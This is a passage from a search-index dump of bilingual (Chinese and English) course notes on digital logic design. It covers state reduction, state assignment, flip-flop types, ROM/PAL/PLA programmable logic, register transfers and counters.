<p>Sequence Recognizer Procedure \u5e8f\u5217\u8bc6\u522b\u5668</p> <p>\u7528\u5904\uff1a\u8bc6\u522b\u8f93\u5165\u5e8f\u5217\uff08\u6bd4\u5982\u8bc6\u522b\u901a\u4fe1\u5e8f\u5217\u4e2d\u7684\u5f00\u59cb\u548c\u7ed3\u675f\uff09\u3002</p> <p>Example: Recognize the sequence 1101.</p> <ul> <li> <p>\u8bc6\u522b 1101:</p> <p></p> </li> <li> <p>\u8003\u8651\u6240\u6709\u53ef\u80fd\u7684\u8f93\u5165\u5e8f\u5217\uff1a</p> <p></p> </li> <li> <p>\u5f97\u5230\u72b6\u6001\u8868</p> <p></p> </li> </ul> <p>\u4e0a\u8ff0\u8fc7\u7a0b\u662f Mealy Model\uff0c\u5982\u679c\u662f Moore Model\uff0c\u5219\u8fd8\u9700\u8981\u589e\u52a0\u4e00\u4e2a\u72b6\u6001\uff1a</p> <p></p> <p></p>"},{"location":"cs/computer_logic/chapter4/#simplification-of-state-diagrams","title":"Simplification of State Diagrams","text":"<p>\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u539f\u59cb\u72b6\u6001\u56fe\u548c\u539f\u59cb\u72b6\u6001\u8868\u4e2d\u5b58\u5728\u7740\u591a\u4f59\u7684\u72b6\u6001\u3002\u72b6\u6001\u4e2a\u6570\u8d8a\u591a\uff0c\u7535\u8def\u4e2d\u6240\u9700\u7684\u89e6\u53d1\u5668\u7684\u6570\u76ee\u4e5f\u8d8a\u591a\uff0c\u5236\u9020\u6210\u672c\u5c31\u8d8a\u9ad8\u3002\u4e3a\u964d\u4f4e\u5236\u9020\u6210\u672c\uff0c\u9700\u8981\u53bb\u6389\u591a\u4f59\u7684\u72b6\u6001\u3002</p> <p>\u6240\u8c13\u72b6\u6001\u7b80\u5316\uff0c\u5c31\u662f\u8981\u83b7\u5f97\u4e00\u4e2a\u6700\u5c0f\u5316\u7684\u72b6\u6001\u8868\u3002\u8fd9\u4e2a\u8868\u4e0d\u4ec5\u80fd\u6b63\u786e\u5730\u53cd\u6620\u8bbe\u8ba1\u7684\u5168\u90e8\u8981\u6c42\uff0c\u800c\u4e14\u72b6\u6001\u7684\u6570\u76ee\u6700\u5c11\u3002</p> <p>\u72b6\u6001\u7b49\u6548\uff1a\u5bf9\u4e8e\u6240\u6709\u53ef\u80fd\u7684\u8f93\u5165\u5e8f\u5217\uff0c\u4e24\u4e2a\u72b6\u6001\u7684\u8f93\u51fa\u5e8f\u5217\u76f8\u540c\uff0c\u4e14\u4e0b\u4e00\u4e2a\u72b6\u6001\u76f8\u540c\u6216\u7b49\u6548\uff0c\u5219\u4e24\u4e2a\u72b6\u6001\u7b49\u6548\uff0c\u53ef\u4ee5\u5408\u5e76\u3002</p> <p>\u72b6\u6001\u7b49\u6548\u5224\u522b\uff1a</p> <p>\u9996\u5148\u8f93\u51fa\u76f8\u540c\uff0c\u540c\u65f6\u6ee1\u8db3\u4ee5\u4e0b\u4e09\u4e2a\u6761\u4ef6\u4e4b\u4e00\uff1a</p> <ul> <li>\u6b21\u6001\u76f8\u540c</li> <li>\u6b21\u6001\u4ea4\u9519</li> <li>\u6b21\u6001\u5faa\u73af</li> </ul> <p>Example</p> <ul> <li> <p>\u6b21\u6001\u76f8\u540c</p> <p></p> </li> <li> <p>\u6b21\u6001\u76f8\u540c\u6216\u4ea4\u9519</p> <p></p> </li> <li> <p>\u6b21\u6001\u76f8\u540c\u6216\u7b49\u6548\uff08\\(S_k, S_l\\) \u7b49\u6548\uff09</p> <p></p> </li> <li> <p>\u6b21\u6001\u4ea4\u9519\u6216\u76f8\u540c\u6216\u5faa\u73af</p> <p></p> </li> </ul> <p>\u5316\u7b80\u65b9\u6cd5\uff1a</p> <ol> <li> <p>\u89c2\u5bdf\u6cd5\u5316\u7b80</p> <p>\u4ece\u72b6\u6001\u56fe/\u72b6\u6001\u8868\u4e2d\u89c2\u5bdf\u51fa\u7b49\u6548\u72b6\u6001\uff0c\u7136\u540e\u5408\u5e76\u3002</p> </li> <li> <p>\u9690\u542b\u8868\u6cd5\u5316\u7b80</p> <p>\u72b6\u6001 \\(S_1, \\dots, S_n\\)\uff0c\u4f5c \\((n-1) \\times (n-1)\\) \u7684\u68af\u5f62\u56fe\uff0c\u5217\u5206\u5e03\u4ee3\u8868 \\(S_1, \\dots, S_{n-1}\\)\uff0c\u884c\u5206\u522b\u4ee3\u8868 \\(S_2, \\dots, S_n\\), \u6bcf\u4e2a\u683c\u5b50\u4ee3\u8868 \\(S_i, S_j\\) \u7684\u6b21\u6001\u662f\u5426\u76f8\u540c\uff0c\u82e5\u65e0\u6cd5\u786e\u5b9a\uff0c\u5219\u5199\u4e0a\u4f9d\u8d56\u7684\u72b6\u6001\u5bf9\u3002\u53ef\u4ee5\u5bb9\u6613\u5730\u770b\u51fa\u4f9d\u8d56\u5173\u7cfb\uff0c\u4ece\u800c\u8fdb\u884c\u5316\u7b80\u3002</p> <p>Example</p> <p>\u5316\u7b80\uff1a</p> <p></p> <p>\u753b\u51fa\u9690\u542b\u8868\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u51fa\uff1a</p> <ul> <li>\\(AB \\rightarrow CF \\rightarrow equivalent\\)</li> <li>\\(AE \\leftrightarrows BE \\rightarrow CF \\rightarrow equivalent \\Rightarrow ABE \\rightarrow equivalent\\)</li> </ul> <p>\u786e\u5b9a\u6700\u5927\u7b49\u6548\u7c7b\uff0c\u4f5c\u6700\u5c0f\u5316\u72b6\u6001\u8868\uff1a</p> <ul> <li>\u56db\u4e2a\u7b49\u6548\u5bf9 \\((A,B), (A,E), (B,E), (C,F)\\)</li> <li>\u6700\u5927\u7b49\u6548\u7c7b \\((A,B,E)\\)</li> <li>\u56db\u4e2a\u72b6\u6001 \\((A,B,E), (C,F), (D), (G)\\)</li> </ul> <p>\u4ee4\u4ee5\u4e0a\u56db\u4e2a\u72b6\u6001\u4f9d\u6b21\u4e3a \\(a, b, c, d\\)\uff0c\u753b\u51fa\u6700\u5c0f\u5316\u72b6\u6001\u8868\uff1a</p> <p></p> </li> </ol>"},{"location":"cs/computer_logic/chapter4/#state-assignment","title":"State Assignment","text":"<p>If the number of states is \\(m\\), then \\(n = \\lceil \\log_2 m \\rceil\\) bits are required to represent the states.</p> <p>There are \\((2^n)!/m!\\) assignments of codes with a minimum number of bits.</p>"},{"location":"cs/computer_logic/chapter4/#find-flip-flop-input-and-output-equations","title":"Find Flip-Flop Input and Output Equations","text":"<p>Use K-maps to compute the equations of \\(D_i, X_{output}\\) with respect to \\(X_{input}, Q_i\\).</p> <p>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u72b6\u6001\u5206\u914d\u7684\u65b9\u6848\u4e0d\u4e00\u6837\uff0c\u6240\u5f97\u5230\u7684\u8f93\u51fa\u51fd\u6570\u548c\u6fc0\u52b1\u51fd\u6570\u7684\u8868\u8fbe\u5f0f\u4e5f\u4e0d\u540c\uff0c\u7531\u6b64\u800c\u8bbe\u8ba1\u51fa\u6765\u7684\u7535\u8def\u590d\u6742\u5ea6\u4e5f\u4e0d\u540c\u3002</p> <p>\u5b9e\u9645\u5e94\u7528\u65f6\u90fd\u662f\u91c7\u7528\u5de5\u7a0b\u8fd1\u4f3c\u7684\u65b9\u6cd5\uff0c\u4f9d\u636e\u4ee5\u4e0b\u56db\u6761\u4ef6\u539f\u5219\u6765\u8fdb\u884c\u72b6\u6001\u5206\u914d\uff1a</p> <ul> <li>\u5728\u76f8\u540c\u8f93\u5165\u6761\u4ef6\u4e0b\u5177\u6709\u76f8\u540c\u6b21\u6001\u7684\u73b0\u6001\uff0c\u5e94\u5c3d\u53ef\u80fd\u5206\u914d\u76f8\u90bb\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801</li> <li>\u5728\u76f8\u90bb\u8f93\u5165\u6761\u4ef6\uff0c\u540c\u4e00\u73b0\u6001\u7684\u6b21\u6001\u5e94\u5c3d\u53ef\u80fd\u5206\u914d\u76f8\u90bb\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801</li> <li>\u8f93\u51fa \u5b8c\u5168\u76f8\u540c \u7684\u73b0\u6001\u5e94\u5c3d\u53ef\u80fd\u5206\u914d\u76f8\u90bb\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801</li> <li>\u6700\u5c0f\u5316\u72b6\u6001\u8868\u4e2d\u51fa\u73b0\u6b21\u6570\u6700\u591a\u7684\u72b6\u6001\u6216\u521d\u59cb\u72b6\u6001\u5e94\u5206\u914d\u903b\u8f91 <code>0</code></li> </ul> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7b2c\u4e00\u6761\u539f\u5219\u8f83\u4e3a\u91cd\u8981\uff0c\u9700\u4f18\u5148\u8003\u8651\uff0c\u5176\u6b21\u8981\u8003\u8651\u7531\u524d\u4e09\u6761\u539f\u5219\u5f97\u5230\u7684\u5e94\u5206\u914d\u76f8\u90bb\u4ee3\u7801\u7684\u72b6\u6001\u5bf9\u51fa\u73b0\u7684\u6b21\u6570\uff0c\u6b21\u6570\u591a\u7684\u72b6\u6001\u5bf9\u5e94\u4f18\u5148\u5206\u914d\u76f8\u90bb\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\u3002</p> <p>Example</p> <p>\u5bf9\u4e0b\u5217\u72b6\u6001\u8868\u8fdb\u884c\u72b6\u6001\u5206\u914d\uff1a</p> <p></p> <ul> <li>\u5728\u76f8\u540c\u8f93\u5165\u6761\u4ef6\u4e0b\u5177\u6709\u76f8\u540c\u6b21\u6001\u7684\u73b0\u6001\uff0c\u5e94\u5c3d\u53ef\u80fd\u5206\u914d\u76f8\u90bb\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\uff1aA \u548c B\uff0cA \u548c C \u5e94\u76f8\u90bb</li> <li>\u5728\u76f8\u90bb\u8f93\u5165\u6761\u4ef6\uff0c\u540c\u4e00\u73b0\u6001\u7684\u6b21\u6001\u5e94\u5c3d\u53ef\u80fd\u5206\u914d\u76f8\u90bb\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\uff1aC \u548c D\uff0cC \u548c A\uff0cB \u548c D\uff0cA \u548c B \u5e94\u76f8\u90bb</li> <li>\u8f93\u51fa\u5b8c\u5168\u76f8\u540c\u7684\u73b0\u6001\u5e94\u5c3d\u53ef\u80fd\u5206\u914d\u76f8\u90bb\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\uff1a A\uff0cB\uff0cC \u4e09\u8005\u5e94\u76f8\u90bb\uff0c\u5373 A \u548c B\uff0cA \u548c C\uff0cB \u548c C\u5e94\u76f8\u90bb</li> <li>\u6700\u5c0f\u5316\u72b6\u6001\u8868\u4e2d\u51fa\u73b0\u6b21\u6570\u6700\u591a\u7684\u72b6\u6001\u6216\u521d\u59cb\u72b6\u6001\u5e94\u5206\u914d\u903b\u8f91 0\uff1aA \u5206\u914d\u4e3a\u903b\u8f91 0</li> </ul> <p>\u7531\u6b64\u5f97\u5230\u72b6\u6001\u5206\u914d\u65b9\u6848\uff1a</p> <p></p>"},{"location":"cs/computer_logic/chapter4/#sequential-design-example","title":"Sequential Design Example","text":"<p>Design a sequential modulo 3 accumulator for 2-bit operands.</p> <ul> <li>Modulo n adder: an adder that gives the result of the addition as the remainder of the sum divided by n.</li> <li>Accumulator: a circuit that \"accumulates\" the sum of its input operands over time - it adds each input operand to the stored sum, which is initially 0. </li> </ul> <p>Stored sum: \\((Y_1, Y_0)\\). Input: \\((X_1, X_0)\\). Output: \\((Z_1, Z_0)\\)</p> <p>State diagram:</p> <p>State table:</p> <p>State assignment \\(\\to\\) Flip-flop input equations.</p>"},{"location":"cs/computer_logic/chapter4/#other-flip-flop-types","title":"Other Flip-Flop Types","text":""},{"location":"cs/computer_logic/chapter4/#j-k-flip-flop","title":"J-K Flip-flop","text":"<p>Similar to SR flip-flop, but without the invalid state.</p> <p>\\(J = K = 1\\) \u65f6\uff0c\u72b6\u6001\u6c42\u53cd\u3002</p> <p>\u4e3b\u4ece\u89e6\u53d1\u5668\u5b9e\u73b0\uff0c\u6709 1s catching \u95ee\u9898\u3002</p> <p>\u7528 D \u89e6\u53d1\u5668\u5b9e\u73b0\uff0c\u907f\u514d 1s catching \u95ee\u9898\uff1a</p> <p>\u4e0a\u5347\u6cbf\u89e6\u53d1\u3002</p>"},{"location":"cs/computer_logic/chapter4/#t-flip-flop","title":"T Flip-flop","text":"<ul> <li>For \\(T = 0\\), no change in state</li> <li>For \\(T = 1\\), changes to opposite state</li> </ul> <p>Same as a J-K flip-flop with \\(J = K = T\\)</p> <p>\u4e00\u822c\u4f1a\u5f3a\u5236\u8bbe\u7f6e\u521d\u6001\u3002</p> <p>\u7528 D \u89e6\u53d1\u5668\u5b9e\u73b0\uff1a</p>"},{"location":"cs/computer_logic/chapter4/#basic-flip-flop-descriptors","title":"Basic Flip-Flop Descriptors","text":"<p>Used in analysis:</p> <ul> <li>characteristic table \u7279\u5f81\u8868: defines the next state of the flip-flop in terms of flip-flop inputs and current state</li> <li>characteristic equation \u7279\u5f81\u65b9\u7a0b: defines the next state of the flip-flop as a Boolean function of flip-flop inputs and current state</li> </ul> <p>Used in design:</p> <ul> <li>excitation table \u6fc0\u52b1\u8868: defines the flip-flop input variable values as function of the current state and next state</li> </ul> <p>D Flip-Flop Descriptors</p> <p>Characteristic table:</p> <p></p> <p>Characteristic equation:</p> \\[     Q(t + 1) = D \\] <p>Excitation table:</p> <p></p> <p>S-R Flip-Flop Descriptors</p> <p>Characteristic table:</p> <p></p> <p>Characteristic equation:</p> \\[     Q(t + 1) = S + \\bar R \\cdot Q(t), S \\cdot R = 0 \\] <p>Excitation table:</p> <p></p>"},{"location":"cs/computer_logic/chapter5/","title":"Digital Hardware Implementation","text":""},{"location":"cs/computer_logic/chapter5/#programmable-implementation-technologies","title":"Programmable Implementation Technologies","text":""},{"location":"cs/computer_logic/chapter5/#programmable-technologies","title":"Programmable Technologies","text":"<ul> <li> <p>Control connections \u8fde\u63a5\u63a7\u5236</p> <ul> <li>Mask programming: \u751f\u4ea7\u65f6\u8fdb\u884c\u8fde\u63a5\u3002\u4e0d\u53ef\u518d\u7f16\u7a0b\u3002</li> <li>Fuse: \u4fdd\u9669\u4e1d\uff0c\u52a0\u5927\u7535\u6d41\u70e7\u65ad\u4fdd\u9669\u4e1d\uff0c\u65ad\u5f00\u8fde\u63a5\u3002\u4e0d\u53ef\u518d\u7f16\u7a0b\u3002</li> <li>Antifuse: \u7535\u6d41\u70e7\u65ad\u4fdd\u9669\u4e1d\uff0c\u77ed\u63a5\u8fde\u63a5\u3002\u4e0d\u53ef\u518d\u7f16\u7a0b\u3002</li> <li>Single-bit storage element: \u5b58\u50a8\u67d0\u4e2a\u4f4d\u662f\u5426\u8fde\u63a5\u3002\u53ef\u518d\u7f16\u7a0b\u3002</li> </ul> </li> <li> <p>Build lookup tables: \u591a\u8def\u9009\u62e9\u5668\u3002\u53ef\u518d\u7f16\u7a0b\u3002</p> </li> <li> <p>Control transistor switching \u9009\u62e9\u63a7\u5236</p> <ul> <li> <p>Stored charge on a floating transistor gate: \u7535\u8377\u5b58\u50a8\u5728\u6d6e\u52a8\u6676\u4f53\u7ba1\u6805\u6781\u4e0a\u3002\u53ef\u518d\u7f16\u7a0b\u3002</p> <ol> <li>EPROM: \u7535\u5b50\u53ef\u64e6\u9664\u53ef\u7f16\u7a0b\u53ea\u8bfb\u5b58\u50a8\u5668\u3002\u7528\u7d2b\u5916\u7ebf\u64e6\u9664\u3002</li> <li>EEPROM: \u7535\u5b50\u53ef\u64e6\u9664\u53ef\u7f16\u7a0b\u53ea\u8bfb\u5b58\u50a8\u5668\u3002\u7528\u7535\u64e6\u9664\u3002</li> <li>Flash memory: \u95ea\u5b58\u3002\u7528\u7535\u64e6\u9664\u3002\u53ef\u518d\u7f16\u7a0b\u3002</li> </ol> </li> </ul> </li> </ul> <p>\u5206\u7c7b</p> <ol> <li> <p>Permanent: </p> <ul> <li>Mask programming</li> <li>Fuse</li> <li>Antifuse</li> </ul> </li> <li> <p>Reprogrammable:</p> <ul> <li> <p>Volatile: \u7535\u6e90\u65ad\u7535\u540e\u6570\u636e\u4e22\u5931</p> <ul> <li>Single-bit storage element</li> </ul> </li> <li> <p>Nonvolatile: \u7535\u6e90\u65ad\u7535\u540e\u6570\u636e\u4e0d\u4e22\u5931</p> <ul> <li>EPROM</li> <li>EEPROM</li> <li>Flash memory</li> </ul> </li> </ul> </li> </ol>"},{"location":"cs/computer_logic/chapter5/#programmable-configurations","title":"Programmable Configurations","text":"<ul> <li>Read Only Memory (ROM): a fixed array of AND gates and a programmable array of OR gates</li> <li>Programmable Array Logic (PAL): a programmable array of AND gates feeding a fixed array of OR gates.</li> <li>Programmable Logic Array (PLA): a programmable array of AND gates feeding a programmable array of OR gates.</li> <li>Complex Programmable Logic Device (CPLD) / Field-Programmable Gate Array (FPGA): complex enough to be called \"architectures\", use lookup tables.</li> </ul>"},{"location":"cs/computer_logic/chapter5/#read-only-memory","title":"Read Only Memory","text":"<ul> <li>N input lines, </li> <li>M output lines,</li> <li>2N decoded minterms.</li> </ul> <p>\u4ea4\u53c9\u70b9\u753b X\uff0c\u8868\u793a\u8be5\u4ea4\u53c9\u70b9\u8fde\u63a5\u3002\u53ef\u7f16\u7a0b\u3002</p> <p>Example</p> <p>\u5b9e\u73b0\u8f93\u5165 \\(x\\)\uff0c\u8f93\u51fa \\(x^2\\)\u3002</p> <p></p> <p>\u7531\u4e8e \\(B_0 = A_0, B_1 = 0\\)\uff0c\u6545\u53ea\u9700\u8981 \\(8\\times 4\\) ROM\u3002</p> <p></p> <p>\u6839\u636e\u771f\u503c\u8868\u7f16\u7a0b ROM\uff1a</p> <p></p>"},{"location":"cs/computer_logic/chapter5/#programmable-array-logic","title":"Programmable Array Logic","text":"<p>Having a programmable set of ANDs combined with fixed ORs.</p> <p>\uff08F1 \u8fd4\u56de\u5230\u8f93\u5165\uff1a\u7f13\u89e3\u4e86\u8f93\u5165\u7684\u9650\u5236\uff09</p>"},{"location":"cs/computer_logic/chapter5/#programmable-logic-array","title":"Programmable Logic Array","text":"<p>Having a programmable set of ANDs combined with a programmable set of ORs.</p> <p>\u5f02\u6216\u95e8\uff1a\u91cd\u7528\u4e0e\u9879\uff0c\u7f13\u89e3\u4e0e\u95e8\u6570\u91cf\u7684\u9650\u5236\u3002</p> <p>Example</p> <p></p> <p>\uff08\u6c42\u6574\u4f53\u53d6\u53cd\u4e4b\u540e\u7684\u5316\u7b80\u7ed3\u679c\uff1a\u5c06 k-map \u53cd\u8f6c\uff09</p> <p></p>"},{"location":"cs/computer_logic/chapter6/","title":"Registers and Register Transfers","text":""},{"location":"cs/computer_logic/chapter6/#registers-microoperations-and-implementations","title":"Registers, Microoperations and Implementations","text":"<p>Register: a collection of binary storage elements </p> <p>In theory, a register is a sequential logic which can be defined by a state table\u3002</p> <p>2-bit Register</p> <p></p> <p>State table:</p> <p></p> <p>\u5f53\u4f4d\u6570\u589e\u52a0\u65f6\uff0c\u72b6\u6001\u8868\u4f1a\u53d8\u5f97\u975e\u5e38\u5927\uff0c\u56e0\u6b64\u9700\u8981\u4e00\u79cd\u66f4\u597d\u7684\u65b9\u5f0f\u6765\u63cf\u8ff0\u5bc4\u5b58\u5668\u3002</p> <p>\u8bbe\u8ba1\u5bc4\u5b58\u5668\u7684\u65b9\u6cd5\uff1a</p> <ul> <li> <p>Add predefined combinational circuits to registers \u7ed9\u5bc4\u5b58\u5668\u6dfb\u52a0\u9884\u5b9a\u4e49\u7684\u7ec4\u5408\u7535\u8def</p> <p>Example: To count up, connect the register flip-flops to an incrementer</p> </li> <li> <p>Design individual cells using the state diagram/state table model and combine them into a register \u5c06\u5bc4\u5b58\u5668\u5206\u89e3\u4e3a\u5355\u72ec\u7684\u5355\u5143\uff0c\u7136\u540e\u5c06\u5b83\u4eec\u7ec4\u5408\u6210\u5bc4\u5b58\u5668</p> </li> </ul>"},{"location":"cs/computer_logic/chapter6/#register-storage-and-load-enable","title":"Register Storage and Load Enable","text":"<p>\u5bc4\u5b58\u5668\u529f\u80fd\uff1a</p> <ul> <li> <p>Load is a frequent name for the signal that controls register storage and loading</p> <ul> <li>Load = 1: Load the values on the data inputs</li> <li>Load = 0: Store the values in the register</li> </ul> </li> </ul> <p>\u9700\u8981\u5b9e\u73b0\u6570\u636e\u4fdd\u6301\uff0c\u5728 Load \u4fe1\u53f7\u63a7\u5236\u4e0b\u8fdb\u884c\u6570\u636e\u5b58\u50a8\u548c\u52a0\u8f7d\u3002\uff08\u4f4e\u7535\u5e73\u6709\u6548\uff09</p> <p>Solution:</p> <ol> <li> <p>Registers with Clock Gating</p> <p></p> <p>\\(clk_G = \\overline{Load} + clk\\)</p> <p>\u7f3a\u70b9\uff1a\u51fa\u73b0\u65f6\u949f\u6b6a\u659c\u3002\u4e0d\u5e94\u51fa\u73b0\u5728\u540c\u6b65\u7535\u8def\u4e2d\u3002</p> </li> <li> <p>Registers with Load-Controlled Feedback</p> <p></p> <p>\u4f7f\u7528\u591a\u8def\u590d\u7528\u5668\u5b9e\u73b0 load \u63a7\u5236\u7684\u6570\u636e\u4fdd\u6301\u3002</p> </li> </ol>"},{"location":"cs/computer_logic/chapter6/#register-transfer-operations","title":"Register Transfer Operations","text":"<p>The movement and processing of data stored in registers.</p> <p>Three basic components:</p> <ul> <li>set of registers</li> <li>operations</li> <li>control of operations</li> </ul> <p>Elementary Operations: load, count, shift, add, bitwise \"OR\", etc, called microoperations.</p> <p>Control of Operations: a set of signals that specify the microoperations to be performed and the registers in which they are to be performed. \u63a7\u5236\u54ea\u4e9b\u5bc4\u5b58\u5668\u4e4b\u95f4\u505a\u4ec0\u4e48\u64cd\u4f5c\u3002</p>"},{"location":"cs/computer_logic/chapter6/#register-notations","title":"Register Notations","text":"<ul> <li>Letters and numbers: \u8868\u793a\u5bc4\u5b58\u5668\u6807\u8bc6\u3002</li> <li>Parentheses<code>()</code>: \u8868\u793a\u5bc4\u5b58\u5668\u7684\u67d0\u4e00\u4f4d\u6216\u67d0\u4e00\u533a\u95f4\u7684\u4f4d\uff0c\u5982 \\(R_1(0)\\)\u3002</li> <li>Arrow <code>&lt;-</code>: \u8868\u793a\u5bc4\u5b58\u5668\u5185\u5bb9\u7684\u4f20\u8f93\uff0c\u5982 \\(R_1 \\leftarrow R_2\\)\u3002</li> <li>Brackets <code>[]</code> \u2013 Specifies a memory address \u8868\u793a\u5185\u5b58\u5730\u5740\u3002\u5982 \\(R_1 \\leftarrow M[PC]\\) \u8868\u793a\u628a PC \u547d\u4ee4\u7684\u5185\u5b58\u5730\u5740\u5b58\u50a8\u5230 R1 \u4e2d\u3002</li> </ul>"},{"location":"cs/computer_logic/chapter6/#conditional-transfer","title":"Conditional Transfer","text":"<p>K \u63a7\u5236\u4f20\u8f93\u7684\u6761\u4ef6\uff0c\u5f53 K \u4e3a 1 \u65f6\uff0c\u4f20\u8f93\u53d1\u751f\u3002</p> <p>Example</p> <p>If (K1=1) then (\\(R_2 \\leftarrow R_1\\)) \u5199\u6210 K1: \\(R_2 \\leftarrow R_1\\)\u3002</p> <p>\u5373 K1 \u63a7\u5236 R2 \u7684\u63a5\u53d7\uff0cR1 \u7684\u5185\u5bb9\u59cb\u7ec8\u5df2\u7ecf\u51c6\u5907\u597d\uff0c\u5f53 K1 \u4e3a 1 \u65f6\uff0cR2 \u63a5\u53d7 R1 \u7684\u5185\u5bb9\u3002</p> <p></p>"},{"location":"cs/computer_logic/chapter6/#arithmetic-microoperations","title":"Arithmetic Microoperations","text":"<p>Shift Microoperations:</p>"},{"location":"cs/computer_logic/chapter6/#register-cell-design","title":"Register Cell Design","text":"<p>Assume that a register consists of identical cells.</p> <p>Each cell has:</p> <ul> <li>a register</li> <li>Data inputs to the register</li> <li>Control input combinations to the register \u63a7\u5236\u4fe1\u53f7</li> <li>A set of register functions \u5bf9\u5e94\u6bcf\u4e2a\u63a7\u5236\u4fe1\u53f7\u7684\u64cd\u4f5c</li> <li>A hold state specification \u4fdd\u6301\u72b6\u6001</li> </ul> <p>Example</p> <p>Register A (m-bits) Specification:</p> <ul> <li>Data input: B</li> <li>Control inputs (CX, CY)</li> <li>Control input combinations (0,0), (0,1) (1,0)</li> <li>Register transfers:<ul> <li>CX: \\(A \\leftarrow B \\vee A\\)</li> <li>CY: \\(A \\leftarrow B \\oplus A\\)</li> </ul> </li> <li>Hold state: (0,0)</li> <li>Load control: Load = CX + CY</li> </ul> <p>Sequential Circuit Design Approach:</p> <p>Find a state diagram or state table \u73b0\u6001\u3001\u8f93\u5165\u3001\u63a7\u5236\u4fe1\u53f7\u5171\u540c\u51b3\u5b9a\u6b21\u6001\u3002</p> <p>\u7eed</p> <p>State Table:</p> <p></p>"},{"location":"cs/computer_logic/chapter6/#register-transfer-structures","title":"Register Transfer Structures","text":""},{"location":"cs/computer_logic/chapter6/#multiplexer-based-transfers","title":"Multiplexer-Based Transfers","text":"<p>Multiplexers connected to register inputs produce flexible transfer structures.</p> <p>Example</p> <p></p> <p>R0 load \u4fe1\u53f7\u4e3a \\(K_1 + K_2 \\overline{K_1} = K_1 + K_2\\)</p>"},{"location":"cs/computer_logic/chapter6/#multiplexer-and-bus-based-transfers-for-multiple-registers","title":"Multiplexer and Bus-Based Transfers for Multiple Registers","text":"<ul> <li> <p>Dedicated MUX-Based Transfers</p> <p></p> <p>\u5f00\u9500\u592a\u5927\u3002</p> </li> <li> <p>Multiplexer Bus</p> <p></p> <p>\u901a\u8fc7\u603b\u7ebf\u8fde\u63a5\u591a\u4e2a\u5bc4\u5b58\u5668\uff0c\u901a\u8fc7\u63a7\u5236\u603b\u7ebf\u7684\u4f20\u8f93\u6765\u63a7\u5236\u5bc4\u5b58\u5668\u7684\u4f20\u8f93\u3002</p> <p>\u4f18\u70b9\uff1a\u7075\u6d3b\uff0c\u5f00\u9500\u5c0f\u3002</p> </li> <li> <p>Three-State Bus</p> <p></p> <p>\u901a\u8fc7\u4e09\u6001\u95e8\u63a7\u5236\u603b\u7ebf\u7684\u4f20\u8f93\u3002</p> </li> </ul>"},{"location":"cs/computer_logic/chapter6/#shift-registers","title":"Shift Registers","text":"<ul> <li>Data input, \\(In\\), is called a serial input or the shift right input.</li> <li>Data output, \\(Out\\), is often called the serial output.</li> <li>The vector \\((A, B, C, Out)\\) is called the parallel output.</li> </ul>"},{"location":"cs/computer_logic/chapter6/#counters","title":"Counters","text":"<p>Counters are sequential circuits which \"count\" through a specific state sequence.  They can count up, count down, or count through other fixed sequences.</p> <ul> <li>Ripple Counters: \u8f93\u5165\u63a5\u5728\u6700\u4f4e\u6709\u6548\u4f4d\u4e0a\uff08LSB\uff09\uff0c\u540e\u9762\u6bcf\u4e00\u4f4d\u7684 clk \u63a5\u5728\u4e0a\u4e00\u4f4d\u7684\u8fdb\u4f4d\u8f93\u51fa\u4e0a\u3002\u4e0d\u662f\u540c\u6b65\u7535\u8def\u3002</li> <li>Synchronous Counters: Logic is used to implement the desired state sequencing. \u540c\u6b65\u7535\u8def\u3002</li> </ul>"},{"location":"cs/computer_logic/chapter6/#ripple-counters","title":"Ripple Counters","text":"<p>\u6bcf\u4e2a\u89e6\u53d1\u5668\u7684\u65f6\u949f\uff0c\u6ca1\u6709\u63a5\u5728\u540c\u4e00\u4e2a\u7cfb\u7edf\u65f6\u949f\u4e0a\uff0c\u662f\u4e00\u4e2a\u5f02\u6b65\u65f6\u5e8f\u7535\u8def\u3002</p>"},{"location":"cs/computer_logic/chapter6/#synchronous-counters","title":"Synchronous Counters","text":"<p>Note</p> <p>\u4f7f\u7528\u4e0e\u95e8\u4fe1\u53f7\u94fe\u63a7\u5236\u8ba1\u6570\uff1a</p> <p></p> <p>\u5f53\u4f4e\u4f4d\u5168\u4e3a 1 \u4e14\u4f7f\u80fd\u4fe1\u53f7\u4e3a 1 \u65f6\uff0c\u9ad8\u4f4d\u6c42\u53cd\u3002</p> <p>\u5f53\u4f4d\u6570\u589e\u52a0\u65f6\u5019\uff0c\u4f7f\u7528 look ahead \u7b80\u5316\u7535\u8def\uff1a\u6bcf\u9694\u82e5\u5e72\u4f4d\uff0c\u5c06\u8f93\u51fa\u4f7f\u7528\u4e0e\u95e8\u63a5\u5728\u4e00\u8d77\u3002</p> <p></p>"},{"location":"cs/computer_logic/chapter6/#other-counters","title":"Other Counters","text":"<ul> <li>Down Counter: counts downward instead of upward</li> <li>Up-Down Counter: counts up or down depending on value a control input such as Up/Down</li> <li>Parallel Load Counter: Has parallel load of values available depending on control input such as Load</li> <li>Modulo n Counter: n \u8fdb\u4f4d\u8ba1\u6570\u5668\uff0c\u5f53\u8ba1\u6570\u5230 n \u65f6\uff0c\u56de\u5230 0\uff0c\u91cd\u65b0\u5f00\u59cb\u8ba1\u6570\u3002</li> </ul>"},{"location":"cs/computer_logic/chapter6/#counter-with-parallel-load","title":"Counter with Parallel Load","text":""},{"location":"cs/computer_logic/chapter6/#modulo-n-counter","title":"Modulo n Counter","text":"<ul> <li> <p>\u4f7f\u7528\u5f02\u6b65\u6e05\u96f6\u5b9e\u73b0\uff1a</p> <p></p> <p>\u7f3a\u70b9\uff1a\u4f1a\u4ea7\u751f\u5f88\u77ed\u7684\u8109\u51b2\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u9519\u8bef\u3002</p> </li> <li> <p>\u4f7f\u7528\u540c\u6b65\u6e05\u96f6\u5b9e\u73b0\uff1a\u63d0\u524d\u51c6\u5907\u597d\u6e05\u96f6\u3002</p> <p></p> <p>\u81ea\u5b9a\u4e49\u521d\u503c\uff1a</p> <p></p> <p>\u4ece 9 \u5f00\u59cb\u8ba1\u6570\u5230 